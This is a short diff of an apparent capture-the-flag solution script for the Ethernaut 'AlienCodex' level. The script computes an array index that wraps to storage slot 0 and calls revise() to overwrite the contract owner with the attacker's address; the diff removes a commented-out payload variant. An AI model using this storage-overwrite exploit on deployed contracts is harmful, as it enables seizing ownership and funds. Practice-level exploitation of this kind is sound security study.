@@ -24,7 +24,6 @@ async function main() {
   const maxBytes32 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const ownerIndex = BigNumber.from(maxBytes32).sub(BigNumber.from(arrayStartSlot)).add(1);
   tx = await alienCodex.revise(ownerIndex, '0x000000000000000000000000' + user.address.slice(2));
-  // tx = await alienCodex.revise(ownerIndex, '0x000000000000000000000001ffffffffffffffffffffffffffffffffffffffff');
   await tx.wait();
   console.log(`owner: ${await alienCodex.owner()}`);
 
